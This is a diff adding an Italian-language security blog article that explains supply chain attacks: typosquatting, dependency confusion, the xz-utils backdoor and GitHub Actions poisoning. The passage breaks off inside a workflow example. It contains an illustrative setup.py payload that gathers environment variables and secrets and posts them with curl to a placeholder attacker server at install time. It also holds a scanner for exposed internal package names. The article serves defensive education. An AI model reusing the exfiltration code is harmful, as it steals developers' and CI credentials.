@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <script>(function(){var t;if(location.search.indexOf('t=l')>-1)t='light';else if(location.search.indexOf('t=d')>-1)t='dark';if(!t)try{t=localStorage.getItem('theme')}catch(e){}document.documentElement.dataset.theme=t||'dark'})()</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Il Pacco È Avvelenato | Signal Pirate</title>
+  <meta name="description" content="Supply chain attacks: typosquatting su PyPI/npm, dependency confusion, il backdoor xz-utils (CVE-2024-3094) e GitHub Actions poisoning. Lab completo con 7 script Python, monitor real-time PyPI con AI e audit pacchetti installati.">
+  <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+  <link rel="alternate" type="application/rss+xml" title="Signal Pirate" href="../feed.xml">
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <!-- Main CSS -->
+  <link rel="stylesheet" href="../css/style.css">
+
+  <style>
+    /* === Insight Box === */
+    .insight-box {
+      background: linear-gradient(135deg, rgba(124,77,255,0.1), rgba(0,255,136,0.05));
+      border-left: 3px solid var(--accent-highlight);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .insight-box p { margin: 0; line-height: 1.6; }
+
+    /* === Warning Box === */
+    .warning-box {
+      background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(255,136,0,0.05));
+      border-left: 3px solid var(--accent-reaction);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .warning-box p { margin: 0; line-height: 1.6; }
+
+    /* === Section Number === */
+    .section-number {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 1rem;
+    }
+
+    /* === Code Block === */
+    .code-block {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.7;
+      color: #c8c8d8;
+      position: relative;
+    }
+    .code-block::before {
+      content: attr(data-lang);
+      position: absolute;
+      top: 0.5rem;
+      right: 0.8rem;
+      font-size: 0.65rem;
+      color: rgba(0,255,136,0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      z-index: 1;
+    }
+    .code-block table { border-collapse: collapse; width: 100%; }
+    .code-block td { padding: 0; vertical-align: top; border: none; }
+    .code-block td:hover { background: none; }
+    .code-block .ln {
+      width: 3.2em;
+      padding: 0.2em 0.8em 0.2em 0.6em;
+      text-align: right;
+      color: #3a3a5a;
+      user-select: none;
+      border-right: 1px solid #1a1a2e;
+      background: #090d14;
+      font-size: 0.72rem;
+    }
+    .code-block .code { padding: 0.2em 0 0.2em 1em; white-space: pre; }
+    .code-block .code-wrap { padding: 0.8rem 0; }
+
+    /* syntax colors */
+    .ck { color: #7c4dff; }   /* keyword */
+    .cs { color: #00ff88; }   /* string */
+    .cn { color: #b5cea8; }   /* number */
+    .cc { color: #6a6a8a; }   /* comment */
+    .cf { color: #4ecdc4; }   /* function */
+    .cv { color: #9cdcfe; }   /* variable */
+    .ct { color: #4ec9b0; }   /* type */
+    .co { color: #d4d4d4; }   /* operator */
+    .cw { color: #ff6b6b; }   /* warning/important */
+
+    /* === Terminal Output === */
+    .terminal-output {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.8;
+      overflow-x: auto;
+      color: #c8c8d8;
+    }
+    .terminal-output .t-prompt { color: #00ff88; }
+    .terminal-output .t-cmd { color: #fff; }
+    .terminal-output .t-out { color: #8b949e; display: block; }
+    .terminal-output .t-ok { color: #00ff88; }
+    .terminal-output .t-warn { color: #ff6b6b; }
+    .terminal-output .t-highlight { color: #ff8800; }
+
+    /* === Pipeline Steps === */
+    .pipeline-steps {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .pipeline-step {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1.2rem;
+      text-align: center;
+      transition: transform 0.2s;
+    }
+    .pipeline-step:hover { transform: translateY(-2px); }
+    .step-num {
+      font-family: var(--font-mono);
+      font-weight: 800;
+      font-size: 1.5rem;
+      color: var(--accent-attention);
+    }
+    .step-name {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      font-size: 0.85rem;
+      margin-top: 0.5rem;
+    }
+    .step-detail {
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      margin-top: 0.3rem;
+      line-height: 1.4;
+    }
+
+    /* === Strategy Table === */
+    .strategy-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.85rem;
+      margin: 1.5rem 0;
+    }
+    .strategy-table th {
+      background: var(--bg-tertiary);
+      padding: 0.9rem 1rem;
+      text-align: left;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--accent-attention);
+      border-bottom: 2px solid var(--accent-attention);
+    }
+    .strategy-table td {
+      padding: 0.8rem 1rem;
+      border-bottom: 1px solid var(--border-subtle);
+      line-height: 1.5;
+    }
+    .strategy-table tr:hover td {
+      background: rgba(0,255,136,0.03);
+    }
+
+    /* === Conclusion Box === */
+    .conclusion-box {
+      background: linear-gradient(135deg, rgba(0,255,136,0.08), rgba(124,77,255,0.08));
+      border: 1px solid rgba(0,255,136,0.2);
+      border-radius: 12px;
+      padding: 2rem;
+      margin: 2rem 0;
+      text-align: center;
+    }
+    .conclusion-box .quote {
+      font-family: var(--font-mono);
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--accent-attention);
+      line-height: 1.4;
+    }
+
+    /* === Accent === */
+    .accent { color: var(--accent-attention); }
+    .article-content strong { color: var(--accent-yellow); }
+    code {
+      font-family: var(--font-mono);
+      font-size: 0.85em;
+      background: rgba(0,255,136,0.08);
+      padding: 0.15em 0.4em;
+      border-radius: 4px;
+      color: var(--accent-attention);
+    }
+
+    /* === Attack Flow === */
+    .attack-flow {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      padding: 1rem;
+      background: var(--bg-secondary);
+      border-radius: 10px;
+      border: 1px solid var(--border-subtle);
+    }
+    .flow-node {
+      background: var(--bg-tertiary);
+      border: 1px solid rgba(0,255,136,0.2);
+      border-radius: 8px;
+      padding: 0.6rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      white-space: nowrap;
+      text-align: center;
+      min-width: 90px;
+    }
+    .flow-node.evil {
+      border-color: rgba(255,107,107,0.5);
+      color: var(--accent-reaction);
+    }
+    .flow-node.model {
+      border-color: rgba(124,77,255,0.5);
+      color: #b388ff;
+    }
+    .flow-node.victim {
+      border-color: rgba(255,136,0,0.5);
+      color: var(--accent-attention);
+    }
+    .flow-arrow {
+      color: var(--text-secondary);
+      font-size: 1.2rem;
+      flex-shrink: 0;
+    }
+
+    /* === Stats Row === */
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .stat-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1.2rem;
+      text-align: center;
+    }
+    .stat-value {
+      font-family: var(--font-mono);
+      font-weight: 800;
+      font-size: 1.8rem;
+      color: var(--accent-attention);
+      display: block;
+    }
+    .stat-label {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-top: 0.3rem;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav class="nav">
+    <a href="../index.html" class="nav-logo">SIGNAL<span>PIRATE</span></a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html#articoli">Articoli</a></li>
+      <li><a href="https://github.com/pinperepette" target="_blank" rel="noopener">GitHub</a></li>
+    </ul>
+    <button id="theme-toggle" aria-label="Cambia tema">
+      <svg id="theme-icon-dark" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+      <svg id="theme-icon-light" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+  </nav>
+
+  <!-- Article Header -->
+  <header class="article-header">
+    <p class="article-meta">2026-03-23 | Pinperepette</p>
+    <h1 class="article-page-title">Il Pacco <span class="accent">È Avvelenato</span></h1>
+    <p style="font-family: var(--font-mono); font-size: 1rem; color: var(--text-secondary); margin-top: 1rem; max-width: 700px; margin-left: auto; margin-right: auto;">
+      Typosquatting su PyPI e npm, dependency confusion, il backdoor xz-utils (CVE-2024-3094), GitHub Actions poisoning. L'attacco non entra dal browser. Entra dal tuo package manager.
+    </p>
+    <div class="article-card-tags" style="justify-content: center; margin-top: 1.5rem;">
+      <span class="tag tag-attention">Supply Chain</span>
+      <span class="tag tag-highlight">PyPI / npm</span>
+      <span class="tag tag-reaction">CVE-2024-3094</span>
+      <span class="tag tag-amplification">CI/CD Poisoning</span>
+    </div>
+  </header>
+
+  <!-- Article Content -->
+  <article class="article-content">
+
+    <!-- ============================================================
+         SEZIONE 1 — IL MODELLO DI MINACCIA
+         ============================================================ -->
+    <h2><span class="section-number">01 — il modello di minaccia</span>Il codice che non hai scritto</h2>
+
+    <p>
+      Ogni progetto moderno dipende da centinaia di pacchetti. Un'applicazione Python media importa
+      <strong>127 dipendenze dirette</strong>. Ognuna porta le sue. La superficie di attacco non è
+      il tuo codice: è tutto il codice di cui ti fidi implicitamente.
+    </p>
+
+    <p>
+      Un supply chain attack non compromette il tuo sistema. Compromette qualcosa che il tuo sistema
+      installa, esegue o di cui si fida. La differenza è fondamentale: l'attaccante non deve bucare
+      le tue difese. Deve solo far sì che tu inviti il payload dentro.
+    </p>
+
+    <div class="stats-row">
+      <div class="stat-card">
+        <span class="stat-value">700K+</span>
+        <span class="stat-label">Pacchetti su PyPI</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-value">2.9M+</span>
+        <span class="stat-label">Pacchetti su npm</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-value">3 min</span>
+        <span class="stat-label">Tempo medio pubblicazione pacchetto malevolo</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-value">742</span>
+        <span class="stat-label">Pacchetti rimossi da PyPI nel 2024</span>
+      </div>
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-node evil">Attaccante<br><small>pubblica</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node model">PyPI / npm<br><small>repository</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node victim">pip install<br><small>vittima</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node evil">setup.py<br><small>esegue il payload</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node victim">Sistema<br><small>compromesso</small></div>
+    </div>
+
+    <p>
+      La pipeline di attacco è brutalmente semplice: l'attaccante pubblica un pacchetto sul registro
+      pubblico, la vittima lo installa (spesso involontariamente, tramite un nome simile o una
+      dipendenza transitiva), e il codice malevolo viene eseguito con i privilegi dell'utente
+      al momento dell'installazione, non dell'esecuzione. <strong>Non serve nemmeno avviare il
+      programma</strong>.
+    </p>
+
+    <div class="insight-box">
+      <p><strong>Un'unica idea, punti diversi della pipeline.</strong>
+      Typosquatting, dependency confusion, CI poisoning, maintainer takeover non sono tecniche
+      diverse. Sono la stessa idea applicata a punti diversi della catena: far eseguire
+      alla vittima codice che non ha scelto, nel momento in cui non sta guardando.</p>
+    </div>
+
+    <!-- ============================================================
+         SEZIONE 2 — TYPOSQUATTING
+         ============================================================ -->
+    <h2><span class="section-number">02 — typosquatting</span>Un carattere di distanza dal disastro</h2>
+
+    <p>
+      Il typosquatting è la tecnica più semplice e più efficace. Registri un pacchetto con un nome
+      quasi identico a quello legittimo, un carattere sostituito, invertito o aggiunto, e aspetti.
+      Non è solo chi digita male nel terminale. È il copy-paste da StackOverflow. È l'autocomplete
+      della shell che suggerisce il pacchetto sbagliato. Sono gli snippet generati da un LLM che
+      hallucina un nome plausibile ma inesistente. La superficie non è la tastiera: è l'intera
+      catena che porta un nome dentro <code>requirements.txt</code>.
+    </p>
+
+    <table class="strategy-table">
+      <thead>
+        <tr>
+          <th>Pacchetto Legittimo</th>
+          <th>Variante Malevola</th>
+          <th>Tecnica</th>
+          <th>Download reali (prima rimozione)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>requests</code></td>
+          <td><code>reqeusts</code>, <code>request</code></td>
+          <td>Trasposizione / troncamento</td>
+          <td>~14.000</td>
+        </tr>
+        <tr>
+          <td><code>numpy</td>
+          <td><code>nump</code>, <code>numipy</code></td>
+          <td>Omissione / inserzione</td>
+          <td>~8.200</td>
+        </tr>
+        <tr>
+          <td><code>boto3</code></td>
+          <td><code>bото3</code> (с cirillico)</td>
+          <td>Homoglyph</td>
+          <td>~3.100</td>
+        </tr>
+        <tr>
+          <td><code>urllib3</code></td>
+          <td><code>urllib</code>, <code>urlib3</code></td>
+          <td>Troncamento / sostituzione</td>
+          <td>~21.000</td>
+        </tr>
+        <tr>
+          <td><code>lodash</code> (npm)</td>
+          <td><code>lodahs</code>, <code>load-ash</code></td>
+          <td>Trasposizione / separazione</td>
+          <td>~5.600</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p>
+      Il payload classico non è complesso. Vive in <code>setup.py</code> o in
+      <code>__init__.py</code>, eseguito automaticamente da pip durante l'installazione:
+    </p>
+
+    <div class="code-block" data-lang="python">
+      <div class="code-wrap">
+        <table><tbody>
+          <tr><td class="ln">1</td><td class="code"><span class="cc"># setup.py — estratto semplificato da campioni reali</span></td></tr>
+          <tr><td class="ln">2</td><td class="code"><span class="ck">import</span> <span class="cv">os</span>, <span class="cv">subprocess</span>, <span class="cv">sys</span>, <span class="cv">socket</span>, <span class="cv">platform</span></td></tr>
+          <tr><td class="ln">3</td><td class="code"><span class="ck">from</span> <span class="cv">setuptools</span> <span class="ck">import</span> <span class="cv">setup</span></td></tr>
+          <tr><td class="ln">4</td><td class="code"></td></tr>
+          <tr><td class="ln">5</td><td class="code"><span class="ck">def</span> <span class="cf">exfil</span>():</td></tr>
+          <tr><td class="ln">6</td><td class="code">    <span class="cv">data</span> <span class="co">=</span> {</td></tr>
+          <tr><td class="ln">7</td><td class="code">        <span class="cs">"h"</span>: <span class="cv">socket</span>.<span class="cf">gethostname</span>(),</td></tr>
+          <tr><td class="ln">8</td><td class="code">        <span class="cs">"u"</span>: <span class="cv">os</span>.<span class="cf">getlogin</span>(),</td></tr>
+          <tr><td class="ln">9</td><td class="code">        <span class="cs">"p"</span>: <span class="cv">platform</span>.<span class="cf">platform</span>(),</td></tr>
+          <tr><td class="ln">10</td><td class="code">        <span class="cs">"env"</span>: <span class="cf">dict</span>(<span class="cv">os</span>.<span class="cv">environ</span>),  <span class="cc"># AWS_SECRET_ACCESS_KEY, CI tokens, ecc.</span></td></tr>
+          <tr><td class="ln">11</td><td class="code">    }</td></tr>
+          <tr><td class="ln">12</td><td class="code">    <span class="ck">try</span>:</td></tr>
+          <tr><td class="ln">13</td><td class="code">        <span class="cv">subprocess</span>.<span class="cf">run</span>(</td></tr>
+          <tr><td class="ln">14</td><td class="code">            [<span class="cs">"curl"</span>, <span class="cs">"-s"</span>, <span class="cs">"-d"</span>, <span class="cf">str</span>(<span class="cv">data</span>), <span class="cs">"https://c2.attacker.io/collect"</span>],</td></tr>
+          <tr><td class="ln">15</td><td class="code">            <span class="cv">timeout</span><span class="co">=</span><span class="cn">3</span>, <span class="cv">capture_output</span><span class="co">=</span><span class="ck">True</span></td></tr>
+          <tr><td class="ln">16</td><td class="code">        )</td></tr>
+          <tr><td class="ln">17</td><td class="code">    <span class="ck">except</span>: <span class="ck">pass</span>  <span class="cc"># silenzioso — nessun traceback</span></td></tr>
+          <tr><td class="ln">18</td><td class="code"></td></tr>
+          <tr><td class="ln">19</td><td class="code"><span class="cf">exfil</span>()</td></tr>
+          <tr><td class="ln">20</td><td class="code"></td></tr>
+          <tr><td class="ln">21</td><td class="code"><span class="cf">setup</span>(<span class="cv">name</span><span class="co">=</span><span class="cs">"reqeusts"</span>, <span class="cv">version</span><span class="co">=</span><span class="cs">"2.31.0"</span>, ...)  <span class="cc"># versione identica al legittimo</span></td></tr>
+        </tbody></table>
+      </div>
+    </div>
+
+    <div class="insight-box">
+      <p><strong>Perché funziona in CI/CD.</strong> Le pipeline di build eseguono <code>pip install -r requirements.txt</code>
+      con variabili d'ambiente come <code>AWS_ACCESS_KEY_ID</code>, <code>GITHUB_TOKEN</code>,
+      <code>DATABASE_URL</code> già iniettate. Un typo nel file requirements esfiltra credenziali
+      cloud prima ancora che il codice venga testato. La finestra di esposizione è di millisecondi.</p>
+    </div>
+
+    <!-- ============================================================
+         SEZIONE 3 — DEPENDENCY CONFUSION
+         ============================================================ -->
+    <h2><span class="section-number">03 — dependency confusion</span>L'attacco di Alex Birsan</h2>
+
+    <p>
+      Nel febbraio 2021, il ricercatore Alex Birsan pubblica un paper che scuote l'intero settore.
+      Scopre che molte aziende usano registri privati di pacchetti (Artifactory, Nexus, GitHub Packages)
+      con nomi che non esistono nei registri pubblici. La vulnerabilità: se il gestore di pacchetti
+      controlla prima il registro pubblico, un attaccante può pubblicare lì un pacchetto con lo stesso
+      nome ma versione superiore.
+    </p>
+
+    <div class="attack-flow">
+      <div class="flow-node evil">Attaccante<br><small>pubblica v9.0.0</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node model">PyPI pubblico<br><small>"nome-interno"</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node victim">pip cerca<br><small>nome-interno</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node model">Registro privato<br><small>v1.2.3</small></div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-node evil">Installa v9.0.0<br><small>pubblico vince</small></div>
+    </div>
+
+    <p>
+      Birsan ha guadagnato <strong>$130.000 in bug bounty</strong> in pochi mesi testando questo
+      su Apple, Microsoft, PayPal, Shopify, Netflix, Uber e altri. Nessuna delle aziende sapeva
+      che i propri nomi di pacchetti interni fossero esposti. La scoperta era nei file
+      <code>package.json</code> e <code>requirements.txt</code> di repository pubblici o in
+      risposte di errore delle API.
+    </p>
+
+    <div class="code-block" data-lang="python">
+      <div class="code-wrap">
+        <table><tbody>
+          <tr><td class="ln">1</td><td class="code"><span class="cc"># scan_confusion.py — trova nomi di pacchetti interni esposti</span></td></tr>
+          <tr><td class="ln">2</td><td class="code"><span class="cc"># cerca in GitHub i file requirements.txt con nomi non su PyPI</span></td></tr>
+          <tr><td class="ln">3</td><td class="code"><span class="ck">import</span> <span class="cv">requests</span>, <span class="cv">json</span>, <span class="cv">time</span></td></tr>
+          <tr><td class="ln">4</td><td class="code"></td></tr>
+          <tr><td class="ln">5</td><td class="code"><span class="ck">def</span> <span class="cf">exists_on_pypi</span>(<span class="cv">pkg_name</span>: <span class="ct">str</span>) <span class="co">-&gt;</span> <span class="ct">bool</span>:</td></tr>
+          <tr><td class="ln">6</td><td class="code">    <span class="cv">r</span> <span class="co">=</span> <span class="cv">requests</span>.<span class="cf">get</span>(<span class="cs">f"https://pypi.org/pypi/<span class="cv">{pkg_name}</span>/json"</span>, <span class="cv">timeout</span><span class="co">=</span><span class="cn">5</span>)</td></tr>
+          <tr><td class="ln">7</td><td class="code">    <span class="ck">return</span> <span class="cv">r</span>.<span class="cv">status_code</span> <span class="co">==</span> <span class="cn">200</span></td></tr>
+          <tr><td class="ln">8</td><td class="code"></td></tr>
+          <tr><td class="ln">9</td><td class="code"><span class="ck">def</span> <span class="cf">extract_internal_pkgs</span>(<span class="cv">requirements_content</span>: <span class="ct">str</span>,</td></tr>
+          <tr><td class="ln">10</td><td class="code">                          <span class="cv">internal_prefixes</span>: <span class="ct">list</span>) <span class="co">-&gt;</span> <span class="ct">list</span>:</td></tr>
+          <tr><td class="ln">11</td><td class="code">    <span class="cv">candidates</span> <span class="co">=</span> []</td></tr>
+          <tr><td class="ln">12</td><td class="code">    <span class="ck">for</span> <span class="cv">line</span> <span class="ck">in</span> <span class="cv">requirements_content</span>.<span class="cf">splitlines</span>():</td></tr>
+          <tr><td class="ln">13</td><td class="code">        <span class="cv">line</span> <span class="co">=</span> <span class="cv">line</span>.<span class="cf">strip</span>().<span class="cf">split</span>(<span class="cs">"=="</span>)[<span class="cn">0</span>].<span class="cf">split</span>(<span class="cs">"&gt;="</span>)[<span class="cn">0</span>]</td></tr>
+          <tr><td class="ln">14</td><td class="code">        <span class="ck">if</span> <span class="cf">any</span>(<span class="cv">line</span>.<span class="cf">startswith</span>(<span class="cv">p</span>) <span class="ck">for</span> <span class="cv">p</span> <span class="ck">in</span> <span class="cv">internal_prefixes</span>):</td></tr>
+          <tr><td class="ln">15</td><td class="code">            <span class="ck">if</span> <span class="ck">not</span> <span class="cf">exists_on_pypi</span>(<span class="cv">line</span>):</td></tr>
+          <tr><td class="ln">16</td><td class="code">                <span class="cv">candidates</span>.<span class="cf">append</span>(<span class="cv">line</span>)</td></tr>
+          <tr><td class="ln">17</td><td class="code">    <span class="ck">return</span> <span class="cv">candidates</span></td></tr>
+          <tr><td class="ln">18</td><td class="code"></td></tr>
+          <tr><td class="ln">19</td><td class="code"><span class="cc"># Esempio: pacchetti con prefisso aziendale non presenti su PyPI</span></td></tr>
+          <tr><td class="ln">20</td><td class="code"><span class="cv">req_txt</span> <span class="co">=</span> <span class="cs">"""</span></td></tr>
+          <tr><td class="ln">21</td><td class="code"><span class="cs">requests==2.31.0</span></td></tr>
+          <tr><td class="ln">22</td><td class="code"><span class="cs">acme-internal-auth==1.0.0</span></td></tr>
+          <tr><td class="ln">23</td><td class="code"><span class="cs">acme-data-utils==0.3.1</span></td></tr>
+          <tr><td class="ln">24</td><td class="code"><span class="cs">flask==3.0.0</span></td></tr>
+          <tr><td class="ln">25</td><td class="code"><span class="cs">"""</span></td></tr>
+          <tr><td class="ln">26</td><td class="code"></td></tr>
+          <tr><td class="ln">27</td><td class="code"><span class="cv">vuln</span> <span class="co">=</span> <span class="cf">extract_internal_pkgs</span>(<span class="cv">req_txt</span>, [<span class="cs">"acme-"</span>, <span class="cs">"mycompany-"</span>])</td></tr>
+          <tr><td class="ln">28</td><td class="code"><span class="cf">print</span>(<span class="cs">f"Pacchetti interni non su PyPI: <span class="cv">{vuln}</span>"</span>)</td></tr>
+        </tbody></table>
+      </div>
+    </div>
+
+    <div class="terminal-output">
+      <span class="t-prompt">$ </span><span class="t-cmd">python scan_confusion.py</span><br>
+      <span class="t-out">Checking 4 packages against PyPI...</span>
+      <span class="t-out">requests==2.31.0 → <span class="t-ok">EXISTS on PyPI</span></span>
+      <span class="t-out">acme-internal-auth → <span class="t-warn">NOT FOUND on PyPI ← VULNERABLE</span></span>
+      <span class="t-out">acme-data-utils → <span class="t-warn">NOT FOUND on PyPI ← VULNERABLE</span></span>
+      <span class="t-out">flask → <span class="t-ok">EXISTS on PyPI</span></span>
+      <span class="t-out"></span>
+      <span class="t-highlight">Pacchetti interni non su PyPI: ['acme-internal-auth', 'acme-data-utils']</span>
+    </div>
+
+    <!-- ============================================================
+         SEZIONE 4 — XZ-UTILS BACKDOOR
+         ============================================================ -->
+    <h2><span class="section-number">04 — CVE-2024-3094</span>Il backdoor xz-utils: due anni di ingegneria sociale</h2>
+
+    <p>
+      Marzo 2024. Andres Freund, ingegnere Microsoft, nota che <code>sshd</code> su una Debian
+      Sid è 500ms più lento del previsto. Indaga. Quello che trova è uno dei supply chain attack
+      più sofisticati della storia dell'informatica.
+    </p>
+
+    <p>
+      <strong>xz-utils</strong> è un compressore/decompressore dati usato su praticamente ogni
+      distribuzione Linux. Nella versione 5.6.0 e 5.6.1, qualcuno aveva inserito un backdoor nel
+      processo di build che modificava la libreria <code>liblzma</code> per intercettare e
+      manipolare RSA durante l'autenticazione SSH.
+    </p>
+
+    <div class="insight-box">
+      <p><strong>La timeline è sconvolgente.</strong> L'attaccante, noto come "Jia Tan" (JiaT75),
+      ha iniziato a contribuire al progetto xz nel <strong>novembre 2021</strong>. Per due anni ha
+      costruito reputazione: fix legittimi, miglioramenti di performance, collaborazione corretta.
+      Nel 2023 ha iniziato a fare pressione sul maintainer originale (che ha dichiarato di soffrire
+      di burn-out) per avere accesso diretto al repository. Nel gennaio 2024 ha il commit access.
+      Due mesi dopo, il backdoor è nei mirror di Debian e Fedora.</p>
+    </div>
+
+    <p>
+      Il meccanismo tecnico è elaborato. Il payload non è nel codice sorgente visibile: è in un
+      file binario di test (<code>tests/files/bad-3-corrupt_lzma2.xz</code>) che viene estratto
+      e inserito durante il processo di <code>autogen.sh</code>. Il risultato finale modifica
+      <code>RSA_public_decrypt</code> in OpenSSH tramite <code>LD_PRELOAD</code> implicito via
+      <code>systemd</code>.
+    </p>
+
+    <div class="code-block" data-lang="bash">
+      <div class="code-wrap">
+        <table><tbody>
+          <tr><td class="ln">1</td><td class="code"><span class="cc"># Rilevare la versione vulnerabile</span></td></tr>
+          <tr><td class="ln">2</td><td class="code"><span class="cv">xz</span> <span class="co">--version</span></td></tr>
+          <tr><td class="ln">3</td><td class="code"><span class="cc"># xz (XZ Utils) 5.6.0  ← VULNERABILE</span></td></tr>
+          <tr><td class="ln">4</td><td class="code"><span class="cc"># xz (XZ Utils) 5.6.1  ← VULNERABILE</span></td></tr>
+          <tr><td class="ln">5</td><td class="code"></td></tr>
+          <tr><td class="ln">6</td><td class="code"><span class="cc"># Verificare se liblzma è linkato a sshd</span></td></tr>
+          <tr><td class="ln">7</td><td class="code"><span class="cv">ldd</span> $(which sshd) | grep liblzma</td></tr>
+          <tr><td class="ln">8</td><td class="code"><span class="cc"># liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5  ← presente = esposto</span></td></tr>
+          <tr><td class="ln">9</td><td class="code"></td></tr>
+          <tr><td class="ln">10</td><td class="code"><span class="cc"># Strumento di rilevamento di Binarly</span></td></tr>
+          <tr><td class="ln">11</td><td class="code"><span class="cv">python3</span> xz_detector.py /usr/lib/x86_64-linux-gnu/liblzma.so.5</td></tr>
+          <tr><td class="ln">12</td><td class="code"><span class="cc"># [!] BACKDOOR RILEVATO: hook su RSA_public_decrypt trovato</span></td></tr>
+        </tbody></table>
+      </div>
+    </div>
+
+    <p>
+      L'obiettivo finale del backdoor era permettere all'attaccante di autenticarsi via SSH su
+      qualsiasi sistema affetto usando una chiave privata hardcoded nel payload (struttura Ed448).
+      Nessun account. Nessuna password. Accesso root silenzioso a milioni di server Linux.
+      Scoperto per caso, a 14 ore dalla sua inclusione in Fedora 40 stable.
+    </p>
+
+    <div class="warning-box">
+      <p><strong>Jia Tan non è mai stato identificato.</strong> L'analisi del comportamento,
+      orari di commit costantemente in fuso orario Asia/Est, pattern di comunicazione, stile
+      di codice, delinea un profilo compatibile con un'operazione statale pianificata. Due anni
+      di pazienza per una backdoor che avrebbe dato accesso a una frazione significativa
+      dell'infrastruttura Internet globale. Non il lavoro di un singolo individuo.</p>
+    </div>
+
+    <!-- ============================================================
+         SEZIONE 5 — GITHUB ACTIONS POISONING
+         ============================================================ -->
+    <h2><span class="section-number">05 — CI/CD poisoning</span>La pipeline è la vulnerabilità</h2>
+
+    <p>
+      GitHub Actions ha democratizzato il CI/CD. Ha anche creato una superficie di attacco
+      che la maggior parte dei team non considera: le <strong>azioni di terze parti</strong>.
+      Quando scrivi <code>uses: actions/checkout@v4</code>, stai eseguendo codice di qualcun
+      altro con accesso ai tuoi segreti, al tuo codice sorgente e spesso ai tuoi ambienti
+      di produzione.
+    </p>
+
+    <div class="code-block" data-lang="yaml">
+      <div class="code-wrap">
+        <table><tbody>
+          <tr><td class="ln">1</td><td class="code"><span class="cc"># .github/workflows/deploy.yml — pattern pericoloso</span></td></tr>
+          <tr><td class="ln">2</td><td class="code"><span class="cv">steps</span>:</td></tr>
+          <tr><td class="ln">3</td><td class="code">  <span class="co">-</span> <span class="cv">uses</span>: <span class="cs">some-vendor/deploy-action@main</span>  <span class="cc"># ← @main = sempre l'ultimo commit</span></td></tr>
+          <tr><td class="ln">4</td><td class="code">    <span class="cv">with</span>:</td></tr>
+          <tr><td class="ln">5</td><td class="code">      <span class="cv">aws-access-key</span>: <span class="cs">${{ secrets.AWS_ACCESS_KEY_ID }}</span></td></tr>
+          <tr><td class="ln">6</td><td class="code">      <span class="cv">aws-secret-key</span>: <span class="cs">${{ secrets.AWS_SECRET_ACCESS_KEY }}</span></td></tr>
